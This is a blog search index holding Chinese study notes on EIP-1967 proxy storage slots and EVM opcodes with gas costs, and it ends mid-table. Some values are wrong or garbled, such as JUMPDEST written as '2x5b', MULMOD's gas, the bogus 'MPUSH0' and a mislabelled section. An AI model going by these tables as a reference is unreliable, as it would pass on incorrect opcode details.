<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>EIP-1967_代理相关的存储槽</title>
    <link href="/2025/04/05/EIP-1967/"/>
    <url>/2025/04/05/EIP-1967/</url>
    
    <content type="html"><![CDATA[<h1 id="ERC-1967"><a href="#ERC-1967" class="headerlink" title="ERC-1967"></a>ERC-1967</h1><blockquote><p><strong>A consistent location where proxies store the address of the logic contract they delegate to, as well as other proxy-specific information.</strong></p></blockquote><p>指明了 “代理合约” 的持续使用的地址，它可以存储 “代理合约” <code>delegatecall</code> 的 “逻辑合约” 以及 “代理合约” 的其他特定信息。</p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>委托 “代理合约” 这一方法被广泛运用于 “可升级合约” 和 节省燃气费。这些代理依赖于 <code>delegatecall</code> <strong>逻辑（实现）合约</strong> 来实现。这允许 “代理合约” 保持一个持久的状态（在 <code>storage</code> 和 <code>balance</code> 方面），同时代码被委托给逻辑合约。</p><p>为避免代理和逻辑合约在存储（<code>storage</code>） 上的冲突，逻辑合约的地址通常被保存在一个特定的存储槽，并保证这段空间永远不会被编译器分配到。这一 EIP 提议：使用一组标准的插槽来存放代理方的信息。这使得像区块链浏览器之类的客户端可以正确提取并向用户们展示这些信息，也使逻辑合约可以选择性地基于逻辑合约操作。</p><h2 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h2><h3 id="逻辑合约（Logic-Contract）地址"><a href="#逻辑合约（Logic-Contract）地址" class="headerlink" title="逻辑合约（Logic Contract）地址"></a>逻辑合约（Logic Contract）地址</h3><p>槽 <code>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>，也可以通过：<code>bytes32(uint256(keccak256(&#39;eip1967.proxy.implementation&#39;)) - 1)</code> 获得。</p><p>这个槽存储该代理合约 <code>delegatecall</code> 的逻辑合约的地址。若使用 “信标”，则该槽为空。对该插槽的任何改变都应通过事件：<code>event Upgraded(address indexed implementation);</code>，来进行通知。</p><h3 id="信标合约（Beacon-Contract）地址"><a href="#信标合约（Beacon-Contract）地址" class="headerlink" title="信标合约（Beacon Contract）地址"></a>信标合约（Beacon Contract）地址</h3><p>槽 <code>0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50</code>，也可以通过：<code>bytes32(uint256(keccak256(&#39;eip1967.proxy.beacon&#39;)) - 1</code> 获得。</p><p>这个槽存储该代理合约依赖的（<code>fallback</code> 调用的）信标合约。若使用 “代理合约”，则该槽为空。当且仅当逻辑合约的槽为空时使用该槽位。对该插槽的任何改变都应通过事件：<code>event BeaconUpgraded(address indexed beacon);</code>，来进行通知。</p><p>信标被用于将多个代理合约的逻辑部分的地址存在一个地方，从而可以通过更改单个插槽开始先对多个代理合约的批量升级。信标合约必须实现这个函数：<code>function implementation() returns (address)</code>。</p><p>基于信标的 “代理合约” 不使用 “逻辑合约” 的那个槽位。相反，“代理合约” 通过 “信标合约” 的槽位来存储它衣服的信标（也就是逻辑合约）。为了知道 “使用信标的代理合约” 的逻辑合约，客户端应该：</p><ul><li>读取 “信标合约” 的地址，来获取它的逻辑合约的存储槽。</li><li>调用 “信标合约” 的 <code>implementation()</code> 函数。</li></ul><p>“信标合约” 中 <code>implementation()</code> 函数的结果 <strong>不应该</strong> 依赖于调用者（<code>msg.sender</code>）。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c">注：就是 <br>  所有使用 逻辑合约A 的代理合约的那个槽<br>               <span class="hljs-string">| 指向</span><br>               v<br>         同一个信标合约地址<br>               <span class="hljs-string">| 调用 implementation() 函数</span><br>               v<br>           逻辑合约A 地址<br><br>因此，对于使用同一 逻辑合约 的无数个不同的 代理合约，<br>只要 代理合约 的那个槽存的是同一个 信标合约的地址，<br>那我们只需要更新那一个 信标合约 里 implementation<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>的返回值，<br>就能实现所有 代理合约的逻辑部分 的批量更新。<br></code></pre></td></tr></table></figure><h3 id="管理员（admin）-地址"><a href="#管理员（admin）-地址" class="headerlink" title="管理员（admin） 地址"></a>管理员（admin） 地址</h3><p>槽 <code>0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103</code>，也可以通过：<code>bytes32(uint256(keccak256(&#39;eip1967.proxy.admin&#39;)) - 1)</code> 获得。</p><p>这个槽存储允许为该 “代理合约” 更新它的 “逻辑合约” 地址的管理员账户（一串地址）。这仅仅是一个可选项。</p><p>对该插槽的任何改变都应通过事件：<code>event AdminChanged(address previousAdmin, address newAdmin);</code>，来进行通知。</p>]]></content>
    
    
    
    <tags>
      
      <tag>EIP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EVMopcodes</title>
    <link href="/2025/03/22/EVMopcodes/"/>
    <url>/2025/03/22/EVMopcodes/</url>
    
    <content type="html"><![CDATA[<h1 id="EVM-opcodes"><a href="#EVM-opcodes" class="headerlink" title="EVM opcodes"></a>EVM opcodes</h1><h2 id="1-EVM-基础"><a href="#1-EVM-基础" class="headerlink" title="1. EVM 基础"></a>1. EVM 基础</h2><p>就像 JVM 是运行 Java 程序的环境，EVM 就是运行智能合约的环境。EVM 基本架构主要包括堆栈，内存，存储，EVM字节码，和燃料费。完整结构如下：</p><p><img src="https://www.wtf.academy/_next/image?url=https%3A%2F%2Fstatic.wtf.academy%2Fimage%2F4bce0eaa45bd9f64525f1454f2f65d5f.png&amp;w=2048&amp;q=75" alt=""></p><h3 id="1-堆栈"><a href="#1-堆栈" class="headerlink" title="1. 堆栈"></a>1. 堆栈</h3><p>字面意思，处理数据的一个栈。每个元素最大 32B（相当于一个 <code>uint256</code> 的大小），最多 1024 个元素， 每次最多取栈顶的16个元素。</p><h3 id="2-内存"><a href="#2-内存" class="headerlink" title="2. 内存"></a>2. 内存</h3><p>用于解决堆栈存储能力有限的问题，类似于动态字节数组。可以按 8 或 256b （1 或 32B）写入，256b 读取。</p><p>类似于 RAM，交易开始和结束时内存会清零，交易中随交易更新。</p><h3 id="3-存储"><a href="#3-存储" class="headerlink" title="3. 存储"></a>3. 存储</h3><p>一种映射，键值都是256b 的数据，支持256b 的读写，数据在被修改前会一直存在链上。读写时消耗的 gas 比内存多。类似于 ROM。</p><h3 id="4-EVM-字节码"><a href="#4-EVM-字节码" class="headerlink" title="4. EVM 字节码"></a>4. EVM 字节码</h3><p>智能合约会被先编译为字节码，然后在 EVM 上运行。字节码表现为一串由 Opcodes 组成的16进制数字。执行时会按顺序读取并执行对应的操作。</p><h3 id="5-Gas"><a href="#5-Gas" class="headerlink" title="5. Gas"></a>5. Gas</h3><p>每个 opcode 按复杂度有对应的 gas，调用合约函数需要提供足够的 gas，不足时会终止当前函数，回滚状态变量，但不会退回已消耗的 gas。</p><h3 id="Opcodes-分类"><a href="#Opcodes-分类" class="headerlink" title="Opcodes 分类"></a>Opcodes 分类</h3><p>按功能，opcodes 大致分为：</p><ul><li>堆栈指令：直接操作栈。包括 <code>PUSHn,0 &lt;= n &lt;= 32</code> 压入 nB 的数据，<code>POP</code> 弹出栈顶元素，等。</li><li>算数指令：计算。包括加减乘除 <code>ADD</code>，<code>SUB</code>，<code>MUL</code>，<code>DIV</code> 等。</li><li>比较指令：比较栈顶的两个元素。包括 <code>GT</code> （greater，大于），<code>LT</code>（less than，小于）等。</li><li>位运算指令：按位操作数据。包括 <code>AND</code>（与），<code>OR</code>（或），<code>NOT</code>（非），<code>XOR</code>（异或）等。</li><li>内存指令：操作内存。包括 <code>MLOAD</code> 将内存数据压到栈，<code>MSTORE</code> 将栈中数据存到内存，等。</li><li>存储指令：操作存储。包括 <code>SLOAD</code> 将存储的数据压到栈，<code>SSTORE</code> 将栈中数据存到存储，等。此类操作耗 gas 比对应内存指令多。</li><li>控制流指令：执行控制流操作。包括 <code>JUMP</code> 跳转，<code>JUMPDEST</code> 跳转目标，等。</li><li>上下文指令：获取上下文信息。包括 <code>CALLER</code>（<code>msg.sender</code>），<code>GAS</code> 获取当前可用的 gas。</li></ul><h2 id="2-堆栈指令"><a href="#2-堆栈指令" class="headerlink" title="2. 堆栈指令"></a>2. 堆栈指令</h2><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">POP</td><td style="text-align:center">0x50</td><td style="text-align:center">2</td><td style="text-align:center">弹出栈顶元素，不存在时抛出异常</td></tr><tr><td style="text-align:center">PUSH0</td><td style="text-align:center">0x5F</td><td style="text-align:center">2</td><td style="text-align:center">向栈中压入0，比用PUSH1压入0省 gas</td></tr><tr><td style="text-align:center">PUSH1~32</td><td style="text-align:center">0x60~0x7F</td><td style="text-align:center">3</td><td style="text-align:center">向栈中压入接下来的1~32B（16进制2位数字为1B）数据</td></tr><tr><td style="text-align:center">DUP1~16</td><td style="text-align:center">0x80~0x8F</td><td style="text-align:center">3</td><td style="text-align:center">将栈顶开始第 i 个数据复制（1 为栈顶，以此类推），压入栈顶</td></tr><tr><td style="text-align:center">SWAP1~16</td><td style="text-align:center">0x90~0x9F</td><td style="text-align:center">3</td><td style="text-align:center">交换栈顶元素与次顶开始第 i 个元素（1为交换栈顶与次顶，2为交换栈顶与第三个元素，以此类推）</td></tr></tbody></table></div><p>例：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5F600050</span>-&gt;</span> stack: [<span class="hljs-number">0</span>]<br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x61FFFF600F</span>-&gt;</span> stack: [<span class="hljs-number">65535</span>, <span class="hljs-number">15</span>]<br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5F5050</span>-&gt;</span> [Error] stack underflow<br></code></pre></td></tr></table></figure><h2 id="3-算数指令"><a href="#3-算数指令" class="headerlink" title="3. 算数指令"></a>3. 算数指令</h2><ul><li><p>当栈顶元素不足两个时，下列指令均抛出与 <code>POP</code> 一致的异常：<code>[Error] stack underflow</code>。</p></li><li><p>负数均以其二进制补码形式出现。</p></li><li>对于除法相关运算，若出现 <code>c / 0</code> 的情况，则直接压入0。</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">ADD (+)</td><td style="text-align:center">0x01</td><td style="text-align:center">3</td><td style="text-align:center">弹出栈顶两个元素，相加后压栈</td></tr><tr><td style="text-align:center">MUL (*)</td><td style="text-align:center">0x02</td><td style="text-align:center">5</td><td style="text-align:center">弹出栈顶两个元素，相乘后压栈</td></tr><tr><td style="text-align:center">SUB (-)</td><td style="text-align:center">0x03</td><td style="text-align:center">3</td><td style="text-align:center">弹出栈顶两个元素，用第一个减去第二个，结果压栈</td></tr><tr><td style="text-align:center">DIV (/)</td><td style="text-align:center">0x04</td><td style="text-align:center">5</td><td style="text-align:center">无符号整除，弹出栈顶两个元素，用第一个整除第二个，结果压栈</td></tr><tr><td style="text-align:center">SDIV</td><td style="text-align:center">0x05</td><td style="text-align:center">5</td><td style="text-align:center">有符号整除，效果同上</td></tr><tr><td style="text-align:center">MOD</td><td style="text-align:center">0x06</td><td style="text-align:center">5</td><td style="text-align:center">无符号取模，弹出栈顶两个元素，取第一个整除第二个的余数，结果入栈</td></tr><tr><td style="text-align:center">SMOD</td><td style="text-align:center">0x07</td><td style="text-align:center">5</td><td style="text-align:center">有符号取模，效果同上。</td></tr><tr><td style="text-align:center">ADDMOD</td><td style="text-align:center">0x08</td><td style="text-align:center">8</td><td style="text-align:center">弹出栈顶三个元素，前两个相加，对第三个取模，结果入栈</td></tr><tr><td style="text-align:center">MULMOD</td><td style="text-align:center">0x09</td><td style="text-align:center">5</td><td style="text-align:center">弹出栈顶三个元素，前两个相乘，对第三个取模，结果入栈</td></tr><tr><td style="text-align:center">EXP</td><td style="text-align:center">0x0A</td><td style="text-align:center">10</td><td style="text-align:center">依次弹出栈顶两个元素 a, b，求 $a^b$，结果入栈</td></tr><tr><td style="text-align:center">SIGNEXTEND</td><td style="text-align:center">0x0B</td><td style="text-align:center">5</td><td style="text-align:center">弹出栈顶两个元素，第一个作为扩展后的位数，对第二个元素，在保留数值和符号的前提下，扩展至对应位数，结果入栈<br />如弹出 <code>0b100</code>，<code>0b11</code>，则结果为 <code>0b0011</code></td></tr></tbody></table></div><h2 id="4-比较指令"><a href="#4-比较指令" class="headerlink" title="4. 比较指令"></a>4. 比较指令</h2><ul><li>当栈顶元素不足两个时，下列指令均抛出与 <code>POP</code> 一致的异常：<code>[Error] stack underflow</code>。</li><li>若不指明，则返回值默认为 <code>uint</code> 类型。</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">LT</td><td style="text-align:center">0x10</td><td style="text-align:center">3</td><td style="text-align:center">弹出栈顶两个元素 a, b，返回 <code>a &lt; b ? 1 ：0</code>，结果入栈</td></tr><tr><td style="text-align:center">GT</td><td style="text-align:center">0x11</td><td style="text-align:center">3</td><td style="text-align:center">弹出栈顶两个元素 a, b，返回 <code>a &gt; b ? 1 ：0</code>，结果入栈</td></tr><tr><td style="text-align:center">SLT</td><td style="text-align:center">0x12</td><td style="text-align:center">3</td><td style="text-align:center">同 LT，但返回值为 <code>int</code> 而非 <code>uint</code></td></tr><tr><td style="text-align:center">SGT</td><td style="text-align:center">0x13</td><td style="text-align:center">3</td><td style="text-align:center">同 GT，但返回值为 <code>int</code> 而非 <code>uint</code></td></tr><tr><td style="text-align:center">EQ</td><td style="text-align:center">0x14</td><td style="text-align:center">3</td><td style="text-align:center">弹出栈顶两个元素 a, b，返回 <code>a == b ? 1 ：0</code>，结果入栈</td></tr><tr><td style="text-align:center">ISZERO</td><td style="text-align:center">0x15</td><td style="text-align:center">3</td><td style="text-align:center">弹出栈顶元素 a，返回 <code>a == 0 ? 1 : 0</code>，结果入栈</td></tr></tbody></table></div><h2 id="5-位级指令"><a href="#5-位级指令" class="headerlink" title="5. 位级指令"></a>5. 位级指令</h2><ul><li>位级运算基于二进制表现形式</li></ul><ol><li><p>与运算（<code>&amp;</code>）：同为1时，结果为1，否则为0</p></li><li><p>或运算（<code>|</code>）：至少有一个为1时，结果为1，否则为0</p></li><li><p>非运算（<code>~</code>）：取反</p></li><li><p>异或运算（<code>^</code>）：不同时结果为1，相同时为0</p></li><li><p>左移（<code>&lt;&lt;</code>）：向左移动指定位数，空位补0</p></li><li><p>右移（<code>&gt;&gt;</code>）：向右移动指定位数</p></li></ol><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">11100 &amp;<span class="hljs-number"> 11010 </span>= 11000<br>11100 |<span class="hljs-number"> 11010 </span>= 11110<br>~10 = 01<br>11100 ^<span class="hljs-number"> 11010 </span>= 10000<br>1010 &lt;&lt;<span class="hljs-number"> 2 </span>= 101000<br>1010 &gt;&gt;<span class="hljs-number"> 2 </span>= 0010<br></code></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">AND</td><td style="text-align:center">0x16</td><td style="text-align:center">3</td><td style="text-align:center">与运算。弹出栈顶两个元素 a, b，返回 <code>a &amp; b</code>，结果入栈</td></tr><tr><td style="text-align:center">OR</td><td style="text-align:center">0x17</td><td style="text-align:center">3</td><td style="text-align:center">或运算，弹出栈顶两个元素 a, b，返回 `a \</td><td>b`，结果入栈</td></tr><tr><td style="text-align:center">XOR</td><td style="text-align:center">0x18</td><td style="text-align:center">3</td><td style="text-align:center">异或运算，弹出栈顶两个元素 a, b，返回 <code>a ^ b</code>，结果入栈</td></tr><tr><td style="text-align:center">NOT</td><td style="text-align:center">0x19</td><td style="text-align:center">3</td><td style="text-align:center">非运算，弹出栈顶元素 a，返回 <code>~a</code>，结果入栈</td></tr><tr><td style="text-align:center">BYTE</td><td style="text-align:center">0x1A</td><td style="text-align:center">3</td><td style="text-align:center">弹出栈顶两个元素 a, b，将 b 看作 32B 的数组，返回从高位开始的第 a 个字节 <code>b[31-a]</code>，结果入栈</td></tr><tr><td style="text-align:center">SHL</td><td style="text-align:center">0x1B</td><td style="text-align:center">3</td><td style="text-align:center">左移，弹出栈顶两个元素 a, b，返回 <code>b &lt;&lt; a</code> ，结果入栈</td></tr><tr><td style="text-align:center">SHR</td><td style="text-align:center">0x1C</td><td style="text-align:center">3</td><td style="text-align:center">逻辑右移，弹出栈顶两个元素 a, b，返回 <code>b &gt;&gt; a</code> ，结果入栈</td></tr><tr><td style="text-align:center">SAR</td><td style="text-align:center">0x1D</td><td style="text-align:center">3</td><td style="text-align:center">算术右移，弹出栈顶两个元素 a, b，返回 <code>b &gt;&gt; a</code> ，当 b 是负数时，最左侧符号位会被填充为 <code>F</code> 以保持负值，结果入栈</td></tr></tbody></table></div><h2 id="6-内存指令"><a href="#6-内存指令" class="headerlink" title="6. 内存指令"></a>6. 内存指令</h2><ul><li>将内存看作一个动态数组，扩充时每一位默认填充为0。</li><li>内存扩充疑似是每次至少扩充 32B。</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">MLOAD</td><td style="text-align:center">0x51</td><td style="text-align:center">3 + x</td><td style="text-align:center">将每 32B 看为一个元素，<br />弹出栈顶元素 offset，获取<code>M[offset]</code>，压入栈</td></tr><tr><td style="text-align:center">MSTORE</td><td style="text-align:center">0x52</td><td style="text-align:center">3 + x</td><td style="text-align:center">将每 32B 看为一个元素，<br />弹出栈顶两个元素 offset, value，将 value 存到 <code>M[offset]</code></td></tr><tr><td style="text-align:center">MSTORE8</td><td style="text-align:center">0x53</td><td style="text-align:center">3 + x</td><td style="text-align:center">将每 1B 看为一个元素，<br />弹出栈顶两个元素 offset, value，将 value 存到 <code>M[offset]</code></td></tr><tr><td style="text-align:center">MSIZE</td><td style="text-align:center">0x59</td><td style="text-align:center">2</td><td style="text-align:center">将当前内存大小（B）压入栈</td></tr></tbody></table></div><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">PUSH1 0x0F<br>PUSH0<br>MSTORE<br>MSIZE<br><br>STACK: [0x20]<br>MEMORY: 0x000000000000000000000000000000000000000000000000000000000000000f<br><span class="hljs-comment">// 63个0</span><br><span class="hljs-code">--------------------------------------------------------------------------</span><br><span class="hljs-code">PUSH1 0x0F</span><br><span class="hljs-code">PUSH0</span><br><span class="hljs-code">MSTORE8</span><br><span class="hljs-code">MSIZE</span><br><span class="hljs-code"></span><br><span class="hljs-code">STACK: [0x20]</span><br><span class="hljs-code">MEMORY: 0x0f00000000000000000000000000000000000000000000000000000000000000</span><br><span class="hljs-code">--------------------------------------------------------------------------</span><br>PUSH1 0x0F<br>PUSH1 0x01<br>MSTORE8<br>MPUSH0<br>MLOAD<br><br>STACK: [0xf000000000000000000000000000000000000000000000000000000000000]// 60个0<br>MEMORY: 000f000000000000000000000000000000000000000000000000000000000000// 000f + 60个0<br></code></pre></td></tr></table></figure><h2 id="7-存储指令"><a href="#7-存储指令" class="headerlink" title="7. 存储指令"></a>7. 存储指令</h2><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">SLOAD</td><td style="text-align:center">0x54</td><td style="text-align:center">如下</td><td style="text-align:center">弹出栈顶元素 key，获取插槽key 中的值，并压入栈</td></tr><tr><td style="text-align:center">SSTORE</td><td style="text-align:center">0x55</td><td style="text-align:center">如下</td><td style="text-align:center">弹出栈顶两个元素 key, value，在存储中 key 位插槽存入value</td></tr></tbody></table></div><h3 id="EIP2929-——-访问集"><a href="#EIP2929-——-访问集" class="headerlink" title="EIP2929 —— 访问集"></a>EIP2929 —— 访问集</h3><p>访问集在外部交易中定义，在交易过程中跟踪和记录每次交易访问的合约地址及存储槽。</p><p>交易执行中，任何被访问的地址都会被添加到访问集。存储槽中包含了一次交易过程中访问的所有槽。</p><p>一个地址或存储槽默认为 cold，当它被访问时会变为 warm。访问一个 cold 的地址或存储槽消耗的 gas 会比访问 warm 的地址或存储槽消耗的 gas 更多。</p><h3 id="Gas-消耗"><a href="#Gas-消耗" class="headerlink" title="Gas 消耗"></a>Gas 消耗</h3><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">cold gas</th><th style="text-align:center">warm gas</th></tr></thead><tbody><tr><td style="text-align:center">SLOAD</td><td style="text-align:center">2100</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center">SSTORE</td><td style="text-align:center">warm gas + 2100</td><td style="text-align:center">如下</td></tr></tbody></table></div><p>a, b, c 未互不相等的非0实数。</p><div class="table-container"><table><thead><tr><th style="text-align:center">初始值</th><th style="text-align:center">当前值</th><th style="text-align:center">新值</th><th style="text-align:center">gas 消耗</th></tr></thead><tbody><tr><td style="text-align:center">任意</td><td style="text-align:center">b</td><td style="text-align:center">b</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">c</td><td style="text-align:center">20000</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">a</td><td style="text-align:center">c</td><td style="text-align:center">2900</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">b</td><td style="text-align:center">a 或 c</td><td style="text-align:center">100</td></tr></tbody></table></div><h3 id="Gas-返还"><a href="#Gas-返还" class="headerlink" title="Gas 返还"></a>Gas 返还</h3><p>当 <code>新值 != 当前值</code> 时，SSTORE 可能触发 gas 返还，规则如下：（gas 返还初始为0）</p><div class="table-container"><table><thead><tr><th style="text-align:center">初始值</th><th style="text-align:center">当前值</th><th style="text-align:center">新值</th><th style="text-align:center">gas 返还</th></tr></thead><tbody><tr><td style="text-align:center">a</td><td style="text-align:center">a</td><td style="text-align:center">0</td><td style="text-align:center">+4800</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">0</td><td style="text-align:center">c</td><td style="text-align:center">-4800</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">b</td><td style="text-align:center">0</td><td style="text-align:center">+4800</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">b</td><td style="text-align:center">0</td><td style="text-align:center">+19900</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">b</td><td style="text-align:center">a</td><td style="text-align:center">warm: +2800<br />cold: +4900</td></tr></tbody></table></div><h2 id="8-控制流指令"><a href="#8-控制流指令" class="headerlink" title="8. 控制流指令"></a>8. 控制流指令</h2><ul><li>pc（程序计数器）为几，就执行第几条操作码。每次执行完后加一。（感觉，可能不是这样的）</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">STOP</td><td style="text-align:center">0x00</td><td style="text-align:center">0</td><td style="text-align:center">停止 EVM</td></tr><tr><td style="text-align:center">JUMP</td><td style="text-align:center">0x56</td><td style="text-align:center">8</td><td style="text-align:center">弹出栈顶元素，将其设为新的程序计数器的值</td></tr><tr><td style="text-align:center">JUMPI</td><td style="text-align:center">0x57</td><td style="text-align:center">10</td><td style="text-align:center">弹出栈顶两个元素 a, condition，<br />若 condition 不为0，将 a 设为新的程序计数器的值</td></tr><tr><td style="text-align:center">PC</td><td style="text-align:center">0x58</td><td style="text-align:center">2</td><td style="text-align:center">将当前的程序计数器的值压入栈</td></tr><tr><td style="text-align:center">JUMPDEST</td><td style="text-align:center">2x5b</td><td style="text-align:center">2</td><td style="text-align:center">作为 JUMP 和 JUMPI 的目标，<br />即 JUMP 和 JUMPI 必须跳转到 JUMPDEST</td></tr></tbody></table></div><h2 id="9-控制流指令"><a href="#9-控制流指令" class="headerlink" title="9. 控制流指令"></a>9. 控制流指令</h2><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">BLOCKHASH</td><td style="text-align:center">0x40</td><td style="text-align:center">20</td><td style="text-align:center">查询特定区块（最近的256个，不包括当前）的hash<br />弹出栈顶作为区块高度，压入它的 hash<br />如果它不属于最近的256个区块，则压入0</td></tr><tr><td style="text-align:center">COINBASE</td><td style="text-align:center">0x41</td><td style="text-align:center">2</td><td style="text-align:center">将当前区块的coinbase（矿工/受益人）地址压入栈</td></tr><tr><td style="text-align:center">TIMESTAMP</td><td style="text-align:center">0x42</td><td style="text-align:center">2</td><td style="text-align:center">将当前区块的时间戳压入栈</td></tr><tr><td style="text-align:center">NUMBER</td><td style="text-align:center">0x43</td><td style="text-align:center">2</td><td style="text-align:center">将当前区块的高度压入栈</td></tr><tr><td style="text-align:center">PREVRANDAO</td><td style="text-align:center">0x44</td><td style="text-align:center">2</td><td style="text-align:center">返回beacon链随机性信标的输出（看不懂）</td></tr><tr><td style="text-align:center">GASLIMIT</td><td style="text-align:center">0x45</td><td style="text-align:center">2</td><td style="text-align:center">当前区块的 gas 限制压入栈</td></tr><tr><td style="text-align:center">CHAINID</td><td style="text-align:center">0x46</td><td style="text-align:center">2</td><td style="text-align:center">将当前的链的 ID 压入栈</td></tr><tr><td style="text-align:center">SELFBALANCE</td><td style="text-align:center">0x47</td><td style="text-align:center">5</td><td style="text-align:center">将当前合约的余额压入栈</td></tr><tr><td style="text-align:center">BASEFEE</td><td style="text-align:center">0x48</td><td style="text-align:center">2</td><td style="text-align:center">将当前区块的基础费压入栈</td></tr></tbody></table></div><h2 id="10-SHA3-指令"><a href="#10-SHA3-指令" class="headerlink" title="10. SHA3 指令"></a>10. SHA3 指令</h2><p>算哈希值的。</p><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">KECCAK256</td><td style="text-align:center">0x20</td><td style="text-align:center">30 + 6* (size + 31) / 32 + 扩展内存成本</td><td style="text-align:center">将每 32B 看为一个元素，<br />弹出栈顶两个元素 offset, size,<br />从 <code>M[offset]</code> 开始读取 size Byte 的数据，哈希后压入栈</td></tr></tbody></table></div><h2 id="11-账户指令"><a href="#11-账户指令" class="headerlink" title="11. 账户指令"></a>11. 账户指令</h2><p>以太坊账户分为外部账户（EOA）和合约账户。外部账户是用户的代表，合约账户是存储和执行智能合约的实体。它们都可以拥有和发送ETH，但只有外部账户可以执行交易以及和合约交互。</p><p>以太坊账户结构相当于地址（20B 的数据）到账户状态的映射。账户状态有4种属性：</p><ol><li><code>Balace</code>：账户余额，单位是 wei</li><li><code>Nouncce</code>：对外部账户，是发起的交易数；对合约账户，是创建的合约数量。</li></ol><p>剩下两种只用合约账户有：</p><ol><li><code>Storage</code>：合约账户的存储空间</li><li><code>Code</code>：合约账户的字节码<br>|    操作     | 操作码 |                     gas                     |                             功能                             |<br>| :————-: | :——: | :————————————————————-: | :—————————————————————————————: |<br>|   BALANCE   |  0x31  | 100 (address warm)<br />2600 (address cold) |         弹出栈顶 20B 的地址，返回该地址的余额并压栈          |<br>| EXTCODESIZE |  0x3B  |                    同上                     |     弹出栈顶 20B 的地址，返回该地址的代码长度（B）并压栈     |<br>| EXTCODECOPY |  0x3C  | 3 * (size + 31) / 32 + 扩展内存成本 + 同上  | 弹出栈顶4个元素address, dest_offset, offset, size，分别为<br />合约地址，拷贝到的地址，读取代码的偏移量和读取长度，<br />读取结果复制到内存中 dest_offset 的地方 |<br>| EXTCODEHASH |  0x3F  |                 同 BALANCE                  | 弹出栈顶 20B 的地址，返回该地址的代码哈希并压栈<br />若合约无代码，返回0的哈希；若合约不存在或被销毁，返回0 |</li></ol><h2 id="12-交易指令"><a href="#12-交易指令" class="headerlink" title="12. 交易指令"></a>12. 交易指令</h2><p>用于 gas 计算：<code>minimum_word_size = (size + 31) / 32</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">ADDRESS</td><td style="text-align:center">0x30</td><td style="text-align:center">2</td><td 